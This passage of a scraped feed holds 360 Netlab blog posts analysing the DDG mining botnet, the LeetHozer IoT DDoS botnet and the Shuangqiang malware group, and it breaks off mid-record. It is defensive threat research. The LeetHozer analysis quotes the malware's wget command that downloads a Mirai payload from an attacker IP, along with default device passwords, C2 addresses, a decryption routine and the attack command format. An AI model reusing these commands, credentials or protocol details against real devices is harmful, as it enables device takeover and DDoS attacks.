08:23:21","updatedTime":"2020-08-25 08:23:21","title":"DDG botnet, round X, is there an ending?","link":"https://blog.netlab.360.com/an-update-on-the-ddg-botnet/","description":"<p>DDG is a mining botnet that we first blogged about in Jan 2018, we reported back then that it had made a profit somewhere between 5.8million and 9.8million RMB(about 820,000 to 1.4Million US dollar ),  we have many follow up <a href=\"https://blog.netlab.360.com/tag/ddg/\"><strong>blogs </strong></a>about this botnet after that, but it shows no sign of slowing down.</p><p>Since November 2019, we started to see a frenzy of version updates of DDG, all together, we counted 20 updates, the following is a timeline:</p><figure class=\"kg-card kg-image-card kg-width-full\"><img src=\"https://blog.netlab.360.com/content/images/2020/04/ddg_version_timeline-2.png\" class=\"kg-image\"></figure><p>This is something unprecedent, more interestingly, we see DDG totally dropped the mechanism for infecting servers on public network, instead, it put all its focus on the servers on intranet.</p><p>DDG now discard the use of XMR wallet so we lost the visibility on the money it makes now, but given the above two factors, it is probably safe to bet this botnet is making very good profits, the author probably is pretty happy with the already compromised devices he got, and he wants to stay low, and is in no rush to expand his bot army.</p><p>In the early days, DDG used IP and DNS for C2 communications, in 2018 we successfully registered two C2 domains in advanced before the author could do so and  <strong><a href=\"https://blog.netlab.360.com/ddg-a-mining-botnet-aiming-at-database-server-en/\">sinkholed</a></strong> the traffic, and we were able to get an accurate count of the compromised servers, 4,391 at that time..</p><p>One year later, in Jan 2019, DDG ditched the DNS C2 and introduced <a href=\"https://github.com/hashicorp/memberlist\"><strong>Memberlist </strong></a>based P2P network into its communication protocol. We <a href=\"https://blog.netlab.360.com/ddg-botnet-a-frenzy-of-updates-before-chinese-new-year-2/\"><strong>blogged </strong></a>about it and was able to tap into the P2P network to track the infected devices again, and we logged a total of 5,695 devices</p><p>In Feb 2020, DDG made a major change regarding to its communication protocol again, a self-developed P2P protocol to build a hybrid P2P network has been adopted. The botnet still needs static C2(IP or dns), but with this new development, the author basically has a fail back safe that even if the c2 is taken down, the infected devices are still going to keep going and perform the mining tasks.</p><p>With this new update, we correspondingly developed a new p2p tracking module that joins the botnet’s P2P network to track it, the number we are getting this time is much lower though, about 900 nodes every day, this has things to do with the new hybrid P2P implementation as it won’t spit out all nodes now.  And keep in mind that the botnet focuses on intranet now, so there are probably many devices behind a single ip.</p><p>To get a better number of the infection in China, we collaborate with a trusted partner in China, and was able to get the daily unique clients count just in China that connect to the active C2 on its C2 port, the daily number is about 17,xxx. the compromised devices are mostly servers, so frequent IP change is not expected, and there will be noise in this number for sure, but the number might provide some perspectives of the botnet’s size just in China.</p><p>We are now <a href=\"https://github.com/0xjiayu/DDGBotnetTracker/tree/master/v2\"><strong>sharing </strong></a>the tracking demo with some related data and data parsing tools at Github, so more security researchers can take a good look at it and hopefully slow down the seemingly unstoppable DDG botnet.</p><p>Currently, DDG only goes after weak SSH password for one single user name <strong>root</strong>, and the password dictionary comes with DDG has <strong>17,907</strong> entries in it, so make sure you have strong password for your <strong>root </strong>(and all other accounts)!</p><p>We are now simultaneously publishing a VERY lengthy technical write up, including IoCs with this blog <strong><a href=\"https://blog.netlab.360.com/ddg-upgrade-to-new-p2p-hybrid-model/\">here</a> </strong>for readers who want to read all the newest details. Take a breath and check it out!</p>","descriptionType":"html","publishedDate":"Wed, 08 Apr 2020 14:13:34 +0000","feedId":9360,"bgimg":"https://blog.netlab.360.com/content/images/2020/04/ddg_version_timeline-2.png","linkMd5":"cbb0a45b375a823b660f75b6a1d2af71","bgimgJsdelivr":"https://cdn.jsdelivr.net/gh/myreaderx16/cdn94@2020_6/2020/08/25/00-23-25-327_5c39446affe970cd.webp","destWidth":2000,"destHeight":269,"sourceBytes":131584,"destBytes":58876,"author":"JiaYu","articleImgCdnMap":{"https://blog.netlab.360.com/content/images/2020/04/ddg_version_timeline-2.png":"https://cdn.jsdelivr.net/gh/myreaderx16/cdn94@2020_6/2020/08/25/00-23-25-327_5c39446affe970cd.webp"},"publishedOrCreatedDate":1598315001053},{"createdTime":"2020-08-25 08:23:21","updatedTime":"2020-08-25 08:23:21","title":"The LeetHozer botnet","link":"https://blog.netlab.360.com/the-leethozer-botnet-en/","description":"<h2 id=\"background\">Background</h2>\n<p>On March 26, 2020, we captured a suspicious sample<code>11c1be44041a8e8ba05be9df336f9231</code>. Although the samples have the word mirai in their names and most antivirus engines identified it as Mirai, its network traffic is totally new,which had got our attention.</p>\n<p>The sample borrowed some of Mirai’s Reporter and Loader mechanism, but the encryption method and Bot program, as well as C2 communication protocol had been totally redesigned.</p>\n<p>For regular Mirai and their variations, normally the changes are fairly minor, changing C2s or encryption keys, or integrate some new vulnerabilities, nothing dramatic.</p>\n<p>But this one is different. Its encryption method is unique, and communication protocol is more rigorous. Also it is very likely a new branch from the Moobot group and is in active development. (the author released a third version while we work on this article, adding some new function and changing Tor C2 :<code>vbrxmrhrjnnouvjf.onion:31337</code>)</p>\n<p>So we think we should blog it and decide to name it LeetHozer because of  the<code>H0z3r</code> string(<code>/bin/busybox wget http://37[.49.226.171:80/bins/mirai.m68k -O - &#62; H0z3r;</code>)</p>\n<p>The targets devices currently observed are mainly <a href=\"http://www.xiongmaitech.com/en/index.php/news/info/12/68\">XiongMai H.264 and H.265 devices</a>.</p>\n<h2 id=\"propagation\">Propagation</h2>\n<ul>\n<li>In 2017, security researchers disclosed the vulnerability<a href=\"https://www.cnblogs.com/mmseh/p/6537924.html\">[2]</a>.</li>\n<li>2020-02-04 POC was released on github<a href=\"https://habr.com/en/post/486856/\">[3]</a>。<a href=\"https://github.com/Snawoot/hisilicon-dvr-telnet\">[4]</a>.</li>\n<li>2020-02-11 We saw a <a href=\"https://blog.netlab.360.com/the-botnet-cluster-on-185-244-25-0-24-en/\">moobot</a> variant we called <code>moobot_xor</code> exploiting this vulnerability.</li>\n<li>2020-03-26 <code>LeetHozer</code> began to exploit the vulnerability.</li>\n</ul>\n<p>LeetHozer takes advantage of the vulnerability through the target device's TCP 9530 port to start the telnetd service, then  login to the device with the default password to complete the infection process. The propagation process is shown in the figure:<br>\n<a href=\"https://blog.netlab.360.com/content/images/2020/04/hozer_flow.png\"><img src=\"https://blog.netlab.360.com/content/images/2020/04/hozer_flow.png\" class=\"kg-image\"></a></p>\n<p>The source IP currently exploiting the vulnerability is around 4.5k per day.<br>\n<a href=\"https://blog.netlab.360.com/content/images/2020/04/dvr.9530.png\"><img src=\"https://blog.netlab.360.com/content/images/2020/04/dvr.9530.m.png\" class=\"kg-image\"></a></p>\n<p>LeetHozer and moobot_xor used the same unique string <code>/bin/busybox DNXXXFF</code>  in their 9530 exploit. We also observed that at times they used the exact same downloader, so we speculate that moobot_xor and LeetHozer probably belong to the same organization or individual.</p>\n<p>The time periods and the downloader shared by the two families are as follows:</p>\n<pre><code>date=2020-03-26 08:11:46+08:00  md5=11c1be44041a8e8ba05be9df336f9231    family_name=LeetHozer \t31337\tddos\tudpplain\t162.244.55.107 \tASN49544 \ti3D.net_B.V\n</code></pre>\n<h2 id=\"reverseanalysis\">Reverse analysis</h2>\n<p>At present, there are three versions of LeetHozer samples (We are going to focus on V2 as V3 is in development now). The difference between V1 and V2 is mainly that V2 supports more DDos attack methods.<br>\n<a href=\"https://blog.netlab.360.com/content/images/2020/04/hozer_version.png\"><img src=\"https://blog.netlab.360.com/content/images/2020/04/hozer_version.png\" class=\"kg-image\"></a><br>\nWe are going to take a quick look at the sample’s behavior, DDos command format, network communication below.</p>\n<blockquote>\n<p>MD5:\t\t57212f7e253ecebd39ce5a8a6bd5d2df</p>\n<p>ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), statically linked, stripped</p>\n<p>Packer:\tNone</p>\n<p>Library: uclibc</p>\n<p>Version: V2</p>\n</blockquote>\n<h3 id=\"samplebehavior\">Sample behavior</h3>\n<p>The function of LeetHozer is relatively simple, when it runs on infected device, it operates the watchdog device,then write the pid to a file named <code>.1</code>, and prints out <code>/bin/sh:./a.out:not found</code> string to the console( to confuse the user?). After that, it starts to scan internet to find more devices with open port 9530, and try to use the vulnerability to open the telnetd service on more victim devices.</p>\n<p>The sample also reports the infected device information to the reporter, and establishes communication with C2, waiting for instructions to launch DDos attack.</p>\n<p>The sample uses a custom algorithm for encryptiton. The decryption algorithm is as follows:</p>\n<pre><code>xorkey=&#34;qE6MGAbI&#34;\n\ndef decode_str(ctxt):\n    for i in range(0,len(xorkey)):\n        plain=&#34;&#34;\n        size=len(ctxt)    \n        for idx in range(0, size):\n            ch=ord(ctxt[idx]) \n            ch ^=(ord(xorkey[i]) + idx )\n            plain += chr(ch)\n        ctxt=plain\n    return ctxt\n</code></pre>\n<p>After decryption, the key information is as follows, including the watchdog devices, C2 to be operated by the Bot. The information will only be decrypted when it is needed by the bot.</p>\n<table>\n<thead>\n<tr>\n<th><strong>.1</strong></th>\n<th><strong>/dev/watchdog</strong></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><strong>/dev/misc/watchdog</strong></td>\n<td><strong>/bin/sh: ./a.out: not found</strong></td>\n</tr>\n<tr>\n<td><strong>w6gr2jqz3eag4ksi.onion</strong></td>\n<td></td>\n</tr>\n</tbody>\n</table>\n<p>The specific implementation of the Bot function is as follows:，</p>\n<ol>\n<li>\n<p>Set watchdog to prevent device restart<br>\n<a href=\"https://blog.netlab.360.com/content/images/2020/04/hozer_dog-1.png\"><img src=\"https://blog.netlab.360.com/content/images/2020/04/hozer_dog-1.png\" class=\"kg-image\"></a></p>\n</li>\n<li>\n<p>Bot singleton through PID file<br>\n<a href=\"https://blog.netlab.360.com/content/images/2020/04/hozer_pid-1.png\"><img src=\"https://blog.netlab.360.com/content/images/2020/04/hozer_pid-1.png\" class=\"kg-image\"></a></p>\n</li>\n<li>\n<p>Scan, exploitation and report information</p>\n<ul>\n<li>\n<p>mirai's fast port scan technique has been borrowed, the scanned port is 9530<br>\n<a href=\"https://blog.netlab.360.com/content/images/2020/04/hozer_scan.png\"><img src=\"https://blog.netlab.360.com/content/images/2020/04/hozer_scan.png\" class=\"kg-image\"></a></p>\n</li>\n<li>\n<p>Use the vulnerability to enable the telnetd service and try to log in with the following credentials.</p>\n<pre><code>root:xc3511\nroot:xmhdipc\nroot:klv123\nroot:123456\nroot:jvbzd\nroot:hi3518\nroot:tsgoingon\n</code></pre>\n</li>\n<li>\n<p>Report device information after successful login<br>\n<a href=\"https://blog.netlab.360.com/content/images/2020/04/hozer_report.png\"><img src=\"https://blog.netlab.360.com/content/images/2020/04/hozer_report.png\" class=\"kg-image\"></a></p>\n</li>\n</ul>\n</li>\n<li>\n<p>Receive the C2 command and prepare for DDos attack. The attack commands supported by different versions are different.</p>\n<table>\n<thead>\n<tr>\n<th>version</th>\n<th>command</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>V1</td>\n<td>tcpraw</td>\n</tr>\n<tr>\n<td>v2</td>\n<td>tcpraw;icmpecho;udpplain</td>\n</tr>\n</tbody>\n</table>\n<p>However, the data format of the attack command is the same, and its structure is <code>Header(6 bytes),Option1,Option2...</code>，in which the structure of Option is<code>Type(2 bytes),Len(2 bytes),Subtype(2 bytes),Contents( Len bytes),Padding</code>, the following takes an actual attack command as an example to explain the parsing process.</p>\n<pre><code>00000000: 3E 00 3F 00 3A 00 01 00  08 00 04 00 75 64 70 70  &#62;.?.:.......udpp\n00000010: 6C 61 69 6E 00 00 00 00  01 00 0E 00 06 00 31 33  lain..........13\n00000020: 39 2E 32 38 2E 32 31 38  2E 31 38 30 00 00 00 00  9.28.218.180....\n00000030: 02 00 01 00 0C 00 50 00  02 00 01 00 05 00 64 00  ......P.......d.\n----------------------------------------------------------------------------\nHeader: \t3E 00 3F 00 3A 00, ----Little endian \n\t\t\t\t0x003E\t\t---- xor key\n\t\t\t\t0x003A\t\t---- 0x3A xor 0x3E = 4 个Option\nOpt 1:\t\t01 00 08 00 04 00, ----Little endian \n\t\t\t\t0x0001\t\t----Type 1,Padding 4 bytes\n\t\t\t\t0x0008\t\t----Content length,len(&#34;udpplain&#34;) = 8\n\t\t\t\t0x0004\t\t----Subtype 4,Contents为attack vector\n\t\t\tContents: udpplain\n\t\t\tPadding: 00 00 00 00\n\t\t\t\nOpt 2:\t\t01 00 0E 00 06 00, ----Little endian \n\t\t\t\t0x0001\t\t----Type 1,Padding 4 bytes\n\t\t\t\t0x000e\t\t----Content length\n\t\t\t\t0x0006\t\t----Subtype 6,Contents为attack target\n             Contents: 139.28.218.180\n             Padding: 00 00 00 00\n\t\t\t\nOpt 3:\t\t02 00 01 00 0c 00, ----Little endian \n\t\t\t\t0x0002\t\t----Type 2,No Padding\n\t\t\t\t0x0001\t\t----Type 2 Ignore this field，Contents length is always 2 bytes\n             0x000c\t\t----Subtype 0xc,Contents为target port\n             Contents: 80\n\nOpt 4:\t\t02 00 01 00 05 00, ----Little endian \n\t\t\t\t0x0002\t\t----Type 2,No Padding\n\t\t\t\t0x0001\t\t----Type 2 Ignore this field，Contents length is always 2 bytes\n\t\t\t\t0x0005\t\t----Subtype 0x05,Contents is attack duration\n             Contents: 0x0064\n</code></pre>\n</li>\n</ol>\n<h3 id=\"communicationprotocols\">Communication protocols</h3>\n<p>Two types of C2: Tor-C2 and IP-C2 has been used. The V2 version has both existed but the code branch where Tor-C2 is located will not be executed. It is likely the V2 version is not final yet.</p>\n<ol>\n<li>\n<p>Tor-C2，supported by V1，Not used in V2.</p>\n<pre><code>  w6gr2jqz3eag4ksi.onion:31337\n</code></pre>\n</li>\n<li>\n<p>IP-C2，supported by V2.</p>\n<pre><code>37.49.226.171:31337\n</code></pre>\n</li>\n</ol>\n<p>Tor-C2 has a pre-process to establish a connection through Tor proxy. After the connection between Bot and C2 is established, it takes two rounds of interaction for the bot to successfully go online.</p>\n<ul>\n<li>\n<p>Establish a connection with C2 through Tor proxy<br>\n<a href=\"https://blog.netlab.360.com/content/images/2020/04/hozer_proxy.png\"><img src=\"https://blog.netlab.360.com/content/images/2020/04/hozer_proxy.png\" class=\"kg-image\"></a></p>\n<p>The hardcode proxy list:</p>\n<pre><code>   45.82.176.194:9034\n   91.236.251.131:9712\n   18.177.13.247:443\n   62.109.8.218:8888\n   82.99.213.98:9191\n   35.225.55.174:9251\n   194.99.22.206:9050\n   45.147.199.142:8060\n   47.104.188.20:8999\n   54.149.179.115:9050\n   195.128.102.178:9050\n   185.176.25.66:9002\n   54.188.106.141:9080\n   193.47.35.56:10000\n   88.193.137.205:9050\n   134.209.84.21:9119\n   194.58.111.244:9050\n   192.99.161.66:9050\n   193.47.35.53:9090\n   167.179.74.97:9251\n   185.30.228.141:9050\n</code></pre>\n</li>\n<li>\n<p>First round of interaction</p>\n<p>The packet length sent by the Bot is 255 bytes, the first 32 bytes are valid data, and the data is interpreted in little-endian way.<br>\n<a href=\"https://blog.netlab.360.com/content/images/2020/04/hozer_roundone.png\"><img src=\"https://blog.netlab.360.com/content/images/2020/04/hozer_roundone.png\" class=\"kg-image\"></a></p>\n<p>The meaning of some key fields</p>\n<table>\n<thead>\n<tr>\n<th>offset</th>\n<th>length</th>\n<th>content</th>\n<th>field meaning</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>0x00</td>\n<td>2 bytes</td>\n<td>0x8f49</td>\n<td>source port</td>\n</tr>\n<tr>\n<td>0x02</td>\n<td>2 bytes</td>\n<td>0x7a69</td>\n<td>hardcode</td>\n</tr>\n<tr>\n<td>0x04</td>\n<td>4 bytes</td>\n<td>0x00004818</td>\n<td>hardcode</td>\n</tr>\n<tr>\n<td>0x0e</td>\n<td>2 bytes</td>\n<td>0x0001</td>\n<td>first  round</td>\n</tr>\n<tr>\n<td>0x14</td>\n<td>4 bytes</td>\n<td>0x0051cc</td>\n<td>checksum</td>\n</tr>\n</tbody>\n</table>\n<p>The calculation of checksum is as follows</p>\n<pre><code>step 1: calc the sum of the first 12 WORD\n\t\t(0x8f49+0x7a69+0x4818+0x0000+0x0000+0x0000\n\t\t+0x0001+0x0000+0x0000+0x0000+0x000+0x0000) = 0x000151CB;\nstep 2:(HWORD(sum) + LWORD(sum)) &#62;&#62; 16\n\t\t(0x0001+0x51CB) &#62;&#62; 16 = 0;\nstep 3:(HWORD(sum) + LWORD(sum)) &#38;&#38; 0Xffff\n\t\t(0x0001+0x51cb) &#38;&#38; 0xffff = 0x000051cc\n</code></pre>\n<p>The first 32 bytes of the C2 reply packet are valid data. The packet length is 255 bytes,interpreted in little-endian way. The Bot will check the two valid flags. When the check passes, part of the data will be used for the second round of interaction.<br>\n<a href=\"https://blog.netlab.360.com/content/images/2020/04/hozer_roundonec.png\"><img src=\"https://blog.netlab.360.com/content/images/2020/04/hozer_roundonec.png\" class=\"kg-image\"></a></p>\n<table>\n<thead>\n<tr>\n<th>offset</th>\n<th>length</th>\n<th>content</th>\n<th>field meaning</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>0x04</td>\n<td>4 bytes</td>\n<td>0x000070f1</td>\n<td>valid flag1</td>\n</tr>\n<tr>\n<td>0x08</td>\n<td>4 bytes</td>\n<td>0x00004819</td>\n<td>valid flag2</td>\n</tr>\n</tbody>\n</table>\n</li>\n<li>\n<p>Second round of interaction</p>\n<p>The packet length sent by the Bot is 255 bytes, the first 32 bytes are valid data, and the data is interpreted in little-endian way. Most of the data comes from the C2 return packets from the previous step.<br>\n<a href=\"https://blog.netlab.360.com/content/images/2020/04/hozer_roundtwo.png\"><img src=\"https://blog.netlab.360.com/content/images/2020/04/hozer_roundtwo.png\" class=\"kg-image\"></a></p>\n<table>\n<thead>\n<tr>\n<th>offset</th>\n<th>length</th>\n<th>content</th>\n<th>field meaning</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>0x00</td>\n<td>8 bytes</td>\n<td>0x7a697a69,0x000070f1</td>\n<td>C2 reply in the round 1</td>\n</tr>\n<tr>\n<td>0x08</td>\n<td>4 bytes</td>\n<td>0x000070f2</td>\n<td>hardcode</td>\n</tr>\n<tr>\n<td>0x0e</td>\n<td>2 bytes</td>\n<td>0x0002</td>\n<td>second round</td>\n</tr>\n<tr>\n<td>0x14</td>\n<td>4 bytes</td>\n<td>0x00d665</td>\n<td>checksum</td>\n</tr>\n</tbody>\n</table>\n<p>The 32 bytes before the C2 reply packet are valid data. The packet length is 255 bytes,interpreted in little-endian way. The Bot will check two valid flags. When the check passes, the Bot's online process is completed.<br>\n<a href=\"https://blog.netlab.360.com/content/images/2020/04/hozer_roundtwoc.png\"><img src=\"https://blog.netlab.360.com/content/images/2020/04/hozer_roundtwoc.png\" class=\"kg-image\"></a></p>\n<table>\n<thead>\n<tr>\n<th>offset</th>\n<th>length</th>\n<th>content</th>\n<th>field meaning</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>0x04</td>\n<td>4 bytes</td>\n<td>0x00002775</td>\n<td>valid flag1</td>\n</tr>\n<tr>\n<td>0x08</td>\n<td>4 bytes</td>\n<td>0x000070f2</td>\n<td>valid flag2</td>\n</tr>\n</tbody>\n</table>\n</li>\n</ul>\n<p>At this point, the identity verification between the Bot and C2 is completed, and the Bot starts to wait for the C2 to issue instructions. The first byte of the C2 reply packet specifies the type of instruction.</p>\n<ul>\n<li>\n<p>Instruction code: <code>0x00</code> indicates heartbeat<br>\n<a href=\"https://blog.netlab.360.com/content/images/2020/04/hozer_heart-1.png\"><img src=\"https://blog.netlab.360.com/content/images/2020/04/hozer_heart-1.png\" class=\"kg-image\"></a></p>\n</li>\n<li>\n<p>Instruction code: <code>0x01</code> indicates reporting Bot group information<br>\n<a href=\"https://blog.netlab.360.com/content/images/2020/04/hozer_group-1.png\"><img src=\"https://blog.netlab.360.com/content/images/2020/04/hozer_group-1.png\" class=\"kg-image\"></a></p>\n</li>\n<li>\n<p>Instruction code: Not <code>0x00</code> <code>0x01</code> indicates DDoS attack.<br>\n<a href=\"https://blog.netlab.360.com/content/images/2020/04/hozer_attack-1.png\"><img src=\"https://blog.netlab.360.com/content/images/2020/04/hozer_attack-1.png\" class=\"kg-image\"></a></p>\n</li>\n</ul>\n<h2 id=\"contactus\">Contact us</h2>\n<p>Readers are always welcomed to reach us on <a href=\"https://twitter.com/360Netlab\">twitter</a> or email to netlab .net/gh/myreaderx18/cdn30@2020_5/2020/08/25/00-23-31-090_9dd0e18f98c7c65a.webp","https://blog.netlab.360.com/content/images/2020/04/hozer_roundtwo.png":"https://cdn.jsdelivr.net/gh/myreaderx1/cdn57@2020_3/2020/08/25/00-23-27-795_1cf2dfa9a8f43fb4.webp","https://blog.netlab.360.com/content/images/2020/04/hozer_roundtwoc.png":"https://cdn.jsdelivr.net/gh/myreaderx30/cdn97@2020_4/2020/08/25/00-23-29-992_b0e18915167a50ab.webp","https://blog.netlab.360.com/content/images/2020/04/hozer_heart-1.png":"https://cdn.jsdelivr.net/gh/myreaderx/cdn53@2020_6/2020/08/25/00-23-28-025_4262b1d048f04eb8.webp","https://blog.netlab.360.com/content/images/2020/04/hozer_group-1.png":"https://cdn.jsdelivr.net/gh/myreaderx7/cdn41@2020_2/2020/08/25/00-23-33-081_bf1ea8146cc2bb10.webp","https://blog.netlab.360.com/content/images/2020/04/hozer_attack-1.png":"https://cdn.jsdelivr.net/gh/myreaderx10/cdn21@2020_2/2020/08/25/00-23-36-190_212a0a74fce759f9.webp"},"publishedOrCreatedDate":1598315001053},{"createdTime":"2020-08-25 08:23:21","updatedTime":"2020-08-25 08:23:21","title":"双枪团伙新动向，借云服务管理数十万僵尸网络","link":"https://blog.netlab.360.com/shuang-qiang-zui-xin-huo-dong-fen-xi-bao-gao-nei-bu-bao-gao-ban/","description":"<p><em>本文作者：<a href=\"https://twitter.com/SethKingHi\">jinye</a>，<a href=\"https://twitter.com/JiaYu_521\">JiaYu</a>，suqitian，核心安全部研究员THL</em></p>\n<h2 id=\"\">概述</h2>\n<p>近日，我们的域名异常监测系统 DNSMon 捕捉到域名 <code>pro.csocools.com</code> 的异常活动。根据数据覆盖度估算，感染规模超过100k。我们通过告警域名关联到一批样本和 C2，分析样本后发现是与双枪恶意程序相关的团伙开始新的大规模活动。近年来双枪团伙屡次被安全厂商曝光和打击，但每次都能死灰复燃高调复出，可见其下发渠道非常庞大。本次依然是因为受感染主机数量巨大，导致互联网监测数据异常，触发了netlab的预警系统。本报告中我们通过梳理和这些URL相关的C2发现了一些模式，做了一些推测。</p>\n<p>我们观察到恶意软件除了使用百度贴吧图片来分发配置文件和恶意软件，还使用了阿里云存储来托管配置文件。为了提高灵活性和稳定性，加大阻拦难度，开发者还利用百度统计这种常见的网络服务来管理感染主机的活跃情况。同时我们在样本中多次发现了腾讯微云的URL地址，有意思的是我们在代码中并没有找到引用这些地址的代码。至此，双枪团伙第一次将BAT三大厂商的服务集成到了自己的程序中，可以预见使用开放服务来管理僵尸网络或将成为流行趋势。有必要澄清的是，这些公开服务本身均为技术中立，此恶意代码中滥用这些公开服务完全是其作者的蓄意行为，各主要互联网公司均在用户许可中明确反对并采取措施抵御这些恶意滥用行为。</p>\n<p>5月14日起，我们联系到了百度安全团队，采取了联合行动，对该恶意代码的传播范围做了度量，并采取了抵御措施。截止本文发稿，相关的恶意代码下载链接已经被阻断。百度安全团队对该事件的声明见文末。</p>\n<h2 id=\"ioc\">IOC关联分析</h2>\n<p>从告警域名入手，通过DNS解析记录和样本流量分析建立IOC关联，过滤掉孤立和噪音节点，我们找到了一组与此次传播活动有关的关键C2。从下面截取的部分IOC关联图可以看出，几乎所有的域名都和两个关键的ip 地址 125.124.255.20 和 125.124.255.79 有关，围绕这两个ip地址，双枪团伙从19年下半年开始依次启用了一批域名来控制和下发恶意程序。事实上这个团伙长期且稳定的控制了大量 125.124.255.0/24 网段的ip地址，可以看出他们拥有非常丰富的网络资源。</p>\n<div align=\"center\"><img width=\"600\" src=\"https://blog.netlab.360.com/content/images/2020/04/IOC_simple.png\"></div>\n<p>通过样本溯源可以看到，这次大规模感染主要是通过诱导用户安装包含恶意代码的网游私服客户端，具体感染方式大体分为两种，下面进行深入分析。</p>\n<div align=\"center\"><img width=\"1000\" src=\"https://blog.netlab.360.com/content/images/2020/04/pljx_infect_flow-2.png\"></div>\n<h2 id=\"1\">感染方式1 — 启动器内包含恶意代码</h2>\n<h3 id=\"1csdll\">阶段1 — 下载并加载cs.dll恶意文件</h3>\n<p>各类私服入口</p>\n<div align=\"center\"><img width=\"700\" src=\"https://blog.netlab.360.com/content/images/2020/04/clinet_web_page.png\"></div>\n<p>点击下载链接跳到私服主页</p>\n<div align=\"center\"><img width=\"700\" src=\"https://blog.netlab.360.com/content/images/2020/04/client_home_page.png\"></div>\n<p>登录器下载 “蟠龙军衔.zip”</p>\n<div align=\"center\"><img width=\"700\" src=\"https://blog.netlab.360.com/content/images/2020/04/clinet_zip_file.png\"></div>\n<p>含恶意代码的私服客户端启动器被用户下载并执行，恶意代码访问配置信息服务器，然后根据配置信息从百度贴吧下载并动态加载名为 <strong>cs.dll</strong> 的最新版本恶意程序。cs.dll 中的敏感字串使用了一种变形的 DES 加密方法，这种加密算法和我们之前捕捉到的双枪样本高度相似。我们从样本主体 exe 文件入手，逐步分析上述恶意行为。</p>\n<ul>\n<li>\n<p>文件结构</p>\n<p>&#34;蟠龙军衔.exe&#34; PE Resource 中包含 7 个文件，Widget.dll 是客户端组件，资源文件中的<strong>cs.dll</strong> 是旧版的恶意程序。4 个 <code>.sys</code> 文件是私服客户端的驱动程序，虽然命名为<code>Game Protect</code>，但我们在代码中发现了劫持流量插入广告的代码。</p>\n<div align=\"center\"><img width=\"500\" src=\"https://blog.netlab.360.com/content/images/2020/04/pljx_pe_res-1.png\"></div>\n</li>\n<li>\n<p>下载配置信息</p>\n<p>启动器创建线程访问加密配置文件 <code>http://mtdlq.oss-cn-beijing.aliyuncs.com/cscsmt.txt</code></p>\n<div align=\"center\"><img width=\"700\" src=\"https://blog.netlab.360.com/content/images/2020/04/get_mtdlq_cfg_code.png\"></div>\n<div align=\"center\"><img width=\"700\" src=\"https://blog.netlab.360.com/content/images/2020/04/mtdlq_cfg.png\"></div>\n<p>页面包含 8 行 16 进制字串，与密钥 <code>B2 09 BB 55 93 6D 44 47</code> 循环异或即可解密。</p>\n<div align=\"center\"><img width=\"700\" src=\"https://blog.netlab.360.com/content/images/2020/04/xor_decrypt_code.png\"></div>\n<p>解密后是 8 个百度贴吧图片的地址。</p>\n<div align=\"center\"><img width=\"700\" src=\"https://blog.netlab.360.com/content/images/2020/04/mtdlq_cfg_decryptd.png\"></div>\n</li>\n<li>\n<p>下载图片文件切割并重组 cs.dll 文件</p>\n<p>直接访问图片地址，图片文内容看起来像是随机生成的。</p>\n <div align=\"center\"><img width=\"700\" src=\"https://blog.netlab.360.com/content/images/2020/04/mtdlq_cfg_tieba_jpg.png\"></div>\n<p>恶意程序会下载图片文件，每张图片使用 <code>&#62;&#60;&#62;&#62;&#62;&#60;</code> 为标记来分隔图像数据和恶意代码数据。</p>\n <div align=\"center\"><img width=\"700\" src=\"https://blog.netlab.360.com/content/images/2020/04/mtdlq_cfg_tiebao_jpg_cut_pe.png\"></div>\n<p>把所有恶意代码拼接起来我们得到了阶段 2 的恶意程序 cs.dll。</p>\n <div align=\"center\"><img width=\"700\" src=\"https://blog.netlab.360.com/content/images/2020/04/cs_abcd_exp_EP.png\"></div>\n<p>恶意程序通过内存映射的方式加载上述 cs.dll，然后调用导出函数 <strong>abcd()</strong> 进入阶段 2 ，所以并没有文件落地。</p>\n <div align=\"center\"><img width=\"700\" src=\"https://blog.netlab.360.com/content/images/2020/04/mtdl_load_cs_abcd.png\"></div>\n</li>\n</ul>\n<h3 id=\"2\">阶段2 — 上报主机信息，释放并加载恶意驱动</h3>\n<p>cs.dll 会进行一些简单的虚拟机和杀软对抗，利用百度统计服务上报 Bot 信息，释放第 3 阶段 VMP 加壳的驱动程序（包含x86/x64两个版本）。</p>\n<ul>\n<li>\n<p>DES 解密算法</p>\n<p>样本中的 DES 解密算法为恶意软件作者自定义实现，加密模式为 CBC，无填充。DES 加密算法的转换表与旧版（<a href=\"https://blog.netlab.360.com/shuang-qiang-mu-ma-ji-chu-she-shi-geng-xin-ji-xiang-ying-chuan-bo-fang-shi-fen-xi/\">“双枪”木马的基础设施更新及相应传播方式的分析</a>）相同 。本次恶意活动涉及的 DES 解密，都涉及 2 层解密，第一层解密，先以 Base64 算法解码字符串 <strong>dBvvIEmQW2s=</strong> 得到一份二进制数据，再以空密钥 <code>\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00</code> 对上述二进制数据解密，得出字串 <code>helloya\\x00</code>，再以此字串作为密钥，用自研 DES 算法解密其他大量密文数据。完整的解密过程如下：</p>\n  <div align=\"center\"><img width=\"800\" src=\"https://blog.netlab.360.com/content/images/2020/04/mal_des-1.png\"></div>\n</li>\n<li>\n<p>检查虚拟主机环境 VM 和 WM</p>\n<p>通过检查注测表项判断是否是 VMWare 主机，如果是 VM 主机代码则直接返回。</p>\n  <div align=\"center\"><img width=\"700\" src=\"https://blog.netlab.360.com/content/images/2020/04/cs_abc_checkVM.png\"></div>\n<p>检查系统服务 <strong>WayOSFw</strong> 是否存在，如果服务存在则直接返回。</p>\n  <div align=\"center\"><img width=\"700\" src=\"https://blog.netlab.360.com/content/images/2020/04/cs_abc_checkWM.png\"></div>\n</li>\n<li>\n<p>创建 Bot ID</p>\n<p>使用系统 API 创建主机的 Bot ID，写入注册表 <code>SOFTWARE\\\\PCID</code>，</p>\n  <div align=\"center\"><img width=\"700\" src=\"https://blog.netlab.360.com/content/images/2020/04/cs_abc_create_bot_id.png\"></div>\n</li>\n<li>\n<p>利用百度统计服务管理 